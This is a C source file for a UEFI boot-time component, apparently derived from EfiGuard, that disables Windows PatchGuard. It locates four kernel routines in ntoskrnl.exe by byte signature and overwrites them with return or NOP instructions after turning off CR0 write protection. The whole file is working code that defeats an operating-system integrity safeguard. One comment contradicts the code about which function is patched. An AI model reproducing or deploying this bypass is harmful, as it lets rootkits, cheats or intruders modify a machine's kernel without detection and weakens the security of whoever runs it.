/** @file
  PatchGuard / KPP bypass implementation.

  Derived from EfiGuard's approach. Uses unique code signatures to find
  PatchGuard initialization functions in ntoskrnl.exe and patches them
  to return immediately.

  Uses .pdata (exception directory / RUNTIME_FUNCTION table) for reliable
  function boundary detection instead of CC padding heuristics.

  Target functions:
  1. KeInitAmd64SpecificState - #DE generator via idiv overflow (INIT section)
  2. KiMcaDeferredRecoveryService - Register zeroing before bugcheck 0x109 (.text)
  3. KiVerifyScopesExecute - Executes KiVerifyXcptRoutines array (INIT section, Win 8.1+)
  4. KiSwInterrupt - int 20h handler dispatching PG verification (.text, Win 10+)

  All writes use CR0.WP disable/enable for write-protected pages.
**/

#include "PatchKpp.h"
#include "PatternScan.h"
#include "PeUtils.h"
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>

//
// Forward declarations for debug logging (defined in DioProcessEfi.c)
//
extern VOID DebugAppend(IN CONST CHAR16 *Str);
extern VOID DebugAppendHex(IN UINT64 Value);
extern VOID DebugAppendDec(IN UINTN Value);

//
// CR0 Write-Protection bit manipulation
//
STATIC
UINT64
DisableWriteProtection(VOID)
{
    UINT64 Cr0 = AsmReadCr0();
    AsmWriteCr0(Cr0 & ~((UINT64)0x10000));
    return Cr0;
}

STATIC
VOID
RestoreWriteProtection(
    IN UINT64 OriginalCr0
    )
{
    AsmWriteCr0(OriginalCr0);
}

//
// Safe memory write/set with WP disabled
//
STATIC
VOID
SafeWrite(
    IN VOID       *Dest,
    IN CONST VOID *Src,
    IN UINTN       Size
    )
{
    UINT64 Cr0 = DisableWriteProtection();
    CopyMem(Dest, Src, Size);
    RestoreWriteProtection(Cr0);
}

STATIC
VOID
SafeSet(
    IN VOID  *Dest,
    IN UINT8  Value,
    IN UINTN  Size
    )
{
    UINT64 Cr0 = DisableWriteProtection();
    SetMem(Dest, Size, Value);
    RestoreWriteProtection(Cr0);
}

// =====================================================================
// Unique signatures from EfiGuard
// =====================================================================

//
// KeInitAmd64SpecificState: The #DE (Divide Error) generator.
// EXTREMELY unique — only this function has this exact idiv sequence.
// Present in all x64 kernels since Vista. Located in INIT section.
//
STATIC CONST UINT8 SigKeInitAmd64[] = {
    0xF7, 0xD9,                     // neg ecx
    0x45, 0x1B, 0xC0,               // sbb r8d, r8d
    0x41, 0x83, 0xE0, 0xEE,         // and r8d, 0FFFFFFEEh
    0x41, 0x83, 0xC0, 0x11,         // add r8d, 11h
    0xD1, 0xCA,                     // ror edx, 1
    0x8B, 0xC2,                     // mov eax, edx
    0x99,                           // cdq
    0x41, 0xF7, 0xF8                // idiv r8d
};

//
// KiMcaDeferredRecoveryService: Register zeroing before bugcheck 0x109.
// Called by KiScanQueues and KiSchedulerDpc (PatchGuard DPCs).
// Located in .text section. We patch its CALLERS, not itself.
//
STATIC CONST UINT8 SigKiMcaDeferredRecovery[] = {
    0x33, 0xC0,                     // xor eax, eax
    0x8B, 0xD8,                     // mov ebx, eax
    0x8B, 0xF8,                     // mov edi, eax
    0x8B, 0xE8,                     // mov ebp, eax
    0x4C, 0x8B, 0xD0                // mov r10, rax
};

//
// KiVerifyScopesExecute: Executes KiVerifyXcptRoutines array.
// The 0xFEFFFFFFFFFFFFFF constant is extremely unique.
// Present since Windows 8.1. Located in INIT section.
// Pattern includes wildcard prefix for context.
//
STATIC CONST UINT8 SigKiVerifyScopes[] = {
    0x83, 0x00, 0x00, 0x00,         // and d/qword ptr [REG+XX], 0 (wildcards)
    0x48, 0xB8,                     // mov rax, imm64
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE  // 0FEFFFFFFFFFFFFFFh
};
STATIC CONST CHAR8 MaskKiVerifyScopes[] = "x??xxxxxxxxxxxxxx";

//
// KiSwInterrupt: int 20h handler (Windows 10+).
// sti / lea REG, [REG-XX] / call KiSwInterruptDispatch / cli
// Located in .text section. Pattern has wildcards for register encoding.
//
STATIC CONST UINT8 SigKiSwInterrupt[] = {
    0xFB,                           // sti
    0x48, 0x8D, 0x00, 0x00,         // lea REG, [REG-XX] (wildcards)
    0xE8, 0x00, 0x00, 0x00, 0x00,   // call KiSwInterruptDispatch (wildcards)
    0xFA                            // cli
};
STATIC CONST CHAR8 MaskKiSwInterrupt[] = "xxx??x????x";

/**
  Apply ret-0 patch at a function entry point with WP disabled.
  Writes: xor eax, eax; ret (33 C0 C3) to return 0.
**/
STATIC
BOOLEAN
ApplyRetPatch(
    IN VOID *FuncAddr
    )
{
    UINT8 Patch[] = { 0x33, 0xC0, 0xC3 };  // xor eax, eax; ret
    if (FuncAddr == NULL) return FALSE;
    SafeWrite(FuncAddr, Patch, sizeof(Patch));
    return TRUE;
}

/**
  Apply mov al, 1; ret patch at a function entry point.
  Used for CcInitializeBcbProfiler which must return TRUE.
**/
STATIC
BOOLEAN
ApplyRetTruePatch(
    IN VOID *FuncAddr
    )
{
    UINT8 Patch[] = { 0xB0, 0x01, 0xC3 };  // mov al, 1; ret
    if (FuncAddr == NULL) return FALSE;
    SafeWrite(FuncAddr, Patch, sizeof(Patch));
    return TRUE;
}

BOOLEAN
PatchKpp(
    IN VOID  *NtoskrnlBase,
    IN UINTN NtoskrnlSize
    )
{
    VOID    *Match;
    BOOLEAN Patched = FALSE;
    UINT8   *TextBase = NULL;
    UINTN   TextSize = 0;
    UINT8   *InitBase = NULL;
    UINTN   InitSize = 0;

    if (NtoskrnlBase == NULL || NtoskrnlSize == 0) {
        return FALSE;
    }

    // Get .text section
    {
        PE_SECTION_HEADER *TextSect = PeFindSection(NtoskrnlBase, ".text");
        if (TextSect != NULL) {
            UINTN vs = TextSect->VirtualSize;
            UINTN rs = TextSect->SizeOfRawData;
            TextBase = (UINT8 *)NtoskrnlBase + TextSect->VirtualAddress;
            TextSize = (vs > rs) ? vs : rs;
        } else {
            TextBase = (UINT8 *)NtoskrnlBase;
            TextSize = NtoskrnlSize;
        }
    }

    // Get INIT section (PG init functions are here)
    {
        PE_SECTION_HEADER *InitSect = PeFindSection(NtoskrnlBase, "INIT");
        if (InitSect != NULL) {
            UINTN vs = InitSect->VirtualSize;
            UINTN rs = InitSect->SizeOfRawData;
            InitBase = (UINT8 *)NtoskrnlBase + InitSect->VirtualAddress;
            InitSize = (vs > rs) ? vs : rs;
            DebugAppend(L"I:");
            DebugAppendDec(InitSize / 1024);
            DebugAppend(L"K ");
        } else {
            DebugAppend(L"I:NF ");
        }
    }

    //
    // 1. Patch KeInitAmd64SpecificState (INIT section, unique idiv pattern)
    //    This is the most critical PG function — MUST be patched.
    //    Search: INIT -> .text -> entire image as fallback
    //
    {
        CHAR8 FullMask[sizeof(SigKeInitAmd64) + 1];
        SetMem(FullMask, sizeof(SigKeInitAmd64), 'x');
        FullMask[sizeof(SigKeInitAmd64)] = '\0';

        Match = NULL;
        if (InitBase != NULL && InitSize > 0) {
            Match = PatternScan(InitBase, InitSize,
                SigKeInitAmd64, FullMask, sizeof(SigKeInitAmd64));
        }
        if (Match == NULL) {
            Match = PatternScan(TextBase, TextSize,
                SigKeInitAmd64, FullMask, sizeof(SigKeInitAmd64));
        }
        // Fallback: search entire image
        if (Match == NULL) {
            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
                SigKeInitAmd64, FullMask, sizeof(SigKeInitAmd64));
        }

        if (Match != NULL) {
            VOID *FuncStart = PeFindFunctionStart(NtoskrnlBase, Match);
            if (FuncStart != NULL) {
                Patched |= ApplyRetPatch(FuncStart);
                DebugAppend(L"K1 ");
            } else {
                DebugAppend(L"K1:FS ");
            }
        } else {
            // Try alternate shorter pattern: cdq + idiv with wildcard registers
            // Matches: ror r32,1 / mov r32,r32 / cdq / REX idiv r?d
            STATIC CONST UINT8 SigK1Alt[] = {
                0xD1, 0x00,             // ror r32, 1 (wildcard reg)
                0x8B, 0x00,             // mov r32, r32 (wildcard)
                0x99,                   // cdq
                0x41, 0xF7, 0x00        // idiv r?d (wildcard rm)
            };
            STATIC CONST CHAR8 MaskK1Alt[] = "x?x?xxx?";
            // Also try without REX (idiv eXX)
            STATIC CONST UINT8 SigK1AltNoRex[] = {
                0xD1, 0x00,             // ror r32, 1
                0x8B, 0x00,             // mov r32, r32
                0x99,                   // cdq
                0xF7, 0x00              // idiv r32 (no REX)
            };
            STATIC CONST CHAR8 MaskK1AltNoRex[] = "x?x?xx?";

            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
                SigK1Alt, MaskK1Alt, sizeof(SigK1Alt));
            if (Match == NULL) {
                Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
                    SigK1AltNoRex, MaskK1AltNoRex, sizeof(SigK1AltNoRex));
            }
            if (Match != NULL) {
                VOID *FuncStart = PeFindFunctionStart(NtoskrnlBase, Match);
                if (FuncStart != NULL) {
                    Patched |= ApplyRetPatch(FuncStart);
                    DebugAppend(L"K1a ");
                } else {
                    DebugAppend(L"K1a:FS ");
                }
            } else {
                DebugAppend(L"K1:NF ");
            }
        }
    }

    //
    // 2. Patch KiMcaDeferredRecoveryService (.text section)
    //    Patch the function itself (it zeroes registers before bugcheck 0x109)
    //
    {
        CHAR8 McaMask[sizeof(SigKiMcaDeferredRecovery) + 1];
        SetMem(McaMask, sizeof(SigKiMcaDeferredRecovery), 'x');
        McaMask[sizeof(SigKiMcaDeferredRecovery)] = '\0';

        Match = PatternScan(TextBase, TextSize,
            SigKiMcaDeferredRecovery, McaMask, sizeof(SigKiMcaDeferredRecovery));
        if (Match != NULL) {
            VOID *FuncStart = PeFindFunctionStart(NtoskrnlBase, Match);
            if (FuncStart != NULL) {
                Patched |= ApplyRetPatch(FuncStart);
                DebugAppend(L"K2 ");
            } else {
                DebugAppend(L"K2:FS ");
            }
        } else {
            DebugAppend(L"K2:NF ");
        }
    }

    //
    // 3. Patch KiVerifyScopesExecute (INIT section, 0xFEFFFFFFFFFFFFFF constant)
    //    Search: INIT -> .text -> entire image
    //
    {
        Match = NULL;
        if (InitBase != NULL && InitSize > 0) {
            Match = PatternScan(InitBase, InitSize,
                SigKiVerifyScopes, MaskKiVerifyScopes, sizeof(SigKiVerifyScopes));
        }
        if (Match == NULL) {
            Match = PatternScan(TextBase, TextSize,
                SigKiVerifyScopes, MaskKiVerifyScopes, sizeof(SigKiVerifyScopes));
        }
        // Fallback: search entire image
        if (Match == NULL) {
            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
                SigKiVerifyScopes, MaskKiVerifyScopes, sizeof(SigKiVerifyScopes));
        }

        // If full pattern not found, try just the unique constant
        if (Match == NULL) {
            STATIC CONST UINT8 SigK3Alt[] = {
                0x48, 0xB8,             // mov rax, imm64
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE
            };
            CHAR8 K3AltMask[sizeof(SigK3Alt) + 1];
            SetMem(K3AltMask, sizeof(SigK3Alt), 'x');
            K3AltMask[sizeof(SigK3Alt)] = '\0';
            Match = PatternScan(NtoskrnlBase, NtoskrnlSize,
                SigK3Alt, K3AltMask, sizeof(SigK3Alt));
        }

        if (Match != NULL) {
            VOID *FuncStart = PeFindFunctionStart(NtoskrnlBase, Match);
            if (FuncStart != NULL) {
                Patched |= ApplyRetPatch(FuncStart);
                DebugAppend(L"K3 ");
            } else {
                DebugAppend(L"K3:FS ");
            }
        } else {
            DebugAppend(L"K3:NF ");
        }
    }

    //
    // 4. Patch KiSwInterrupt (NOP the sti...cli block, .text section, Win10+)
    //
    {
        Match = PatternScan(TextBase, TextSize,
            SigKiSwInterrupt, MaskKiSwInterrupt, sizeof(SigKiSwInterrupt));
        if (Match != NULL) {
            // NOP the entire sti..call..cli block (11 bytes)
            SafeSet(Match, 0x90, sizeof(SigKiSwInterrupt));
            Patched = TRUE;
            DebugAppend(L"K4 ");
        } else {
            DebugAppend(L"K4:NF ");
        }
    }

    return Patched;
}
